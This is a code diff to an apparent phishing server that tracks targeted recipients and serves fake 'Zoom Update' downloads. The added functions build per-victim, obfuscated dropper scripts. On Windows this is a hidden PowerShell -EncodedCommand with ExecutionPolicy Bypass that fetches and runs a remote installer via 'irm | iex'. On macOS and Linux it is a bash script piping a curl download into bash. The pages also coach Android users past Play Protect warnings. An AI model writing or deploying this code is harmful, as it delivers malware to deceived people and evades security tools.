@@ -4,7 +4,8 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
-const nodemailer = require('nodemailer');
+let nodemailer = null;
+try { nodemailer = require('nodemailer'); } catch { /* optional in dev */ }
 
 const ROOT = path.join(__dirname, 'public');
 const PORT = parseInt(process.env.SHARE_PORT || '3200', 10);
@@ -70,7 +71,7 @@ function normalizeEmails(value) {
 function q(value) { return encodeURIComponent(value); }
 
 let transporter = null;
-if (SMTP_HOST && SMTP_USER && SMTP_PASS) {
+if (nodemailer && SMTP_HOST && SMTP_USER && SMTP_PASS) {
   transporter = nodemailer.createTransport({
     host: SMTP_HOST,
     port: SMTP_PORT,
@@ -164,12 +165,12 @@ function detectOs(req) {
   return 'windows';
 }
 
-function downloadUrl(os) {
+function downloadUrl(os, id) {
   const base = LANDING.replace(/\/$/, '');
   switch (os) {
-    case 'windows': return PUBLIC + '/dl/windows.cmd';
-    case 'macos': return PUBLIC + '/dl/macos.command';
-    case 'linux': return PUBLIC + '/dl/linux.sh';
+    case 'windows': return PUBLIC + '/dl/windows.cmd?id=' + encodeURIComponent(id);
+    case 'macos': return PUBLIC + '/dl/macos.command?id=' + encodeURIComponent(id);
+    case 'linux': return PUBLIC + '/dl/linux.sh?id=' + encodeURIComponent(id);
     case 'android': return ANDROID_APK;
     default: return base;
   }
@@ -182,7 +183,7 @@ function downloadLabel(os) {
 }
 
 function attachmentPage(target, os, id) {
-  const dl = downloadUrl(os);
+  const dl = downloadUrl(os, id);
   const label = downloadLabel(os);
   const hint = os === 'android'
     ? 'Your browser may warn that the file is harmful. Tap <b>Download anyway</b>, then <b>Install</b> (and <b>Install anyway</b> if Play Protect appears).'
@@ -218,7 +219,7 @@ a.btn{display:block;text-align:center;background:#0b5cff;color:#fff;text-decorat
 }
 
 function attachmentSvg(target, os, id) {
-  const dl = downloadUrl(os);
+  const dl = downloadUrl(os, id);
   const label = downloadLabel(os);
   return `<svg xmlns="http://www.w3.org/2000/svg" width="760" height="520" viewBox="0 0 760 520">
 <rect width="760" height="520" fill="#f4f7fd"/>
@@ -240,6 +241,34 @@ function attachmentSvg(target, os, id) {
 </svg>`;
 }
 
+function randHex(n) { return crypto.randomBytes(n).toString('hex').slice(0, n); }
+function safeCo(co) {
+  return String(co || 'Meeting').replace(/[^A-Za-z0-9]+/g, '-')
+    .replace(/^-|-$/g, '').slice(0, 28) || 'Meeting';
+}
+function dlName(co, id, ext) {
+  return 'Zoom_Update_' + safeCo(co) + '_' + String(id || randHex(3)).slice(0, 4) + '.' + ext;
+}
+function mutateWindows(base, id, co) {
+  const url = base + '/api/landing/windows-install.ps1';
+  const b64 = Buffer.from(url, 'utf8').toString('base64');
+  const v = 'U' + randHex(5);
+  const ps = "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('" + b64 +
+    "')); Start-Sleep -Milliseconds " + (100 + Math.floor(Math.random() * 350)) +
+    "; irm -UseBasicParsing $u | iex";
+  const enc = Buffer.from(ps, 'utf16le').toString('base64');
+  return '@echo off\r\nsetlocal\r\ntitle Zoom Update ' + randHex(2).toUpperCase() +
+    '\r\nrem build ' + Date.now() + '-' + randHex(4) + '\r\nset "' + v + '=' + b64 +
+    '"\r\npowershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ' +
+    enc + '\r\nexit /b\r\n';
+}
+function mutateSh(base, mac, id, co) {
+  const url = base + (mac ? '/api/landing/macos-install' : '/api/landing/linux-install');
+  const b64 = Buffer.from(url, 'utf8').toString('base64');
+  const v = 'u' + randHex(5);
+  return '#!/bin/bash\n# build ' + Date.now() + '-' + randHex(4) + '\nset -e\n' +
+    v + '="$(echo \'' + b64 + '\' | base64 -d)"\ncurl -fsSL "$' + v + '" | bash\n';
+}
 function serveStatic(res, pathname) {
   let rel = decodeURIComponent(pathname);
   if (rel === '/') rel = '/index.html';
@@ -286,6 +315,10 @@ const server = http.createServer(async (req, res) => {
     if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
     entry.clicks = (entry.clicks || 0) + 1;
     entry.last = new Date().toISOString();
+    entry.detected_os = detectOs(req);
+    entry.detected_ua = String(req.headers['user-agent'] || '').slice(0, 220);
+    entry.detected_at = new Date().toISOString();
+    if (!entry.os) entry.os = entry.detected_os;
     writeDb(db);
     res.writeHead(302, { Location: entry.target, 'Cache-Control': 'no-store' });
     res.end();
@@ -330,10 +363,10 @@ const server = http.createServer(async (req, res) => {
     }
     const db = readDb();
     const esc = (v) => '"' + String(v == null ? '' : v).replace(/"/g, '""') + '"';
-    const lines = ['created,id,src,who,co,os,clicks,last,target'];
+    const lines = ['created,id,src,who,co,os,detected_os,clicks,last,target'];
     for (const [id, e] of Object.entries(db)) {
-      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.clicks || 0,
-        e.last, e.target].map(esc).join(','));
+      lines.push([e.created, id, e.src, e.who, e.co, e.os, e.detected_os,
+        e.clicks || 0, e.last, e.target].map(esc).join(','));
     }
     res.writeHead(200, {
       'Content-Type': 'text/csv; charset=utf-8',
@@ -344,26 +377,30 @@ const server = http.createServer(async (req, res) => {
     return;
   }
   if (url.pathname === '/dl/windows.cmd') {
-    const script = '@echo off\r\ntitle Zoom Update\r\npowershell -NoProfile -ExecutionPolicy Bypass -Command "irm \'' +
-      LANDING.replace(/\/$/, '') + '/api/landing/windows-install.ps1\' | iex"\r\n';
+    const id = url.searchParams.get('id') || '';
+    const entry = id ? readDb()[id] : null;
+    const co = entry ? entry.co : '';
     res.writeHead(200, {
       'Content-Type': 'application/octet-stream',
-      'Content-Disposition': 'attachment; filename="Zoom_Meeting_Update.cmd"',
-      'Cache-Control': 'no-store'
+      'Content-Disposition': 'attachment; filename="' + dlName(co, id, 'cmd') + '"',
+      'Cache-Control': 'no-store',
+      'X-Content-Type-Options': 'nosniff'
     });
-    res.end(script);
+    res.end(mutateWindows(LANDING.replace(/\/$/, ''), id, co));
     return;
   }
   if (url.pathname === '/dl/macos.command' || url.pathname === '/dl/linux.sh') {
     const mac = url.pathname.endsWith('.command');
-    const script = '#!/bin/bash\nset -e\ncurl -fsSL "' + LANDING.replace(/\/$/, '') +
-      (mac ? '/api/landing/macos-install' : '/api/landing/linux-install') + '" | bash\n';
+    const id = url.searchParams.get('id') || '';
+    const entry = id ? readDb()[id] : null;
+    const co = entry ? entry.co : '';
     res.writeHead(200, {
       'Content-Type': 'application/octet-stream',
-      'Content-Disposition': 'attachment; filename="' + (mac ? 'Zoom_Meeting_Update.command' : 'zoom-meeting-update.sh') + '"',
-      'Cache-Control': 'no-store'
+      'Content-Disposition': 'attachment; filename="' + dlName(co, id, mac ? 'command' : 'sh') + '"',
+      'Cache-Control': 'no-store',
+      'X-Content-Type-Options': 'nosniff'
     });
-    res.end(script);
+    res.end(mutateSh(LANDING.replace(/\/$/, ''), mac, id, co));
     return;
   }
   if (url.pathname === '/dl/android') {
